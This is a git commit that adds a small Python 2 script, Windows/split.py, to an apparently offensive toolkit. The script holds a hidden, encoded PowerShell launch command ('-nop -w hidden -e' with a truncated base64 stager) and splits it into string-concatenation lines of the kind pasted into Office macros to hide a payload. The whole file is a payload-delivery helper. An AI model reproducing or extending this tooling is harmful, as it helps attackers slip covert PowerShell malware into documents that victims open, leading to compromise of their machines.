db6124d8f82d8404dfc58e1cb46446cd4c077293
Malachi Woodlee <malachi.woodlee@gmail.com>
2025-09-27 12:30:07 -0400

    Update split.py

--- Windows/split.py
+++ Windows/split.py
@@ -1,1 +1,8 @@
+#!/usr/bin/python
 
+str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgB..."
+
+n = 50
+
+for i in range(0, len(str), n):
+  print "Str = Str + " + '"' + str[i:i+n] + '"'
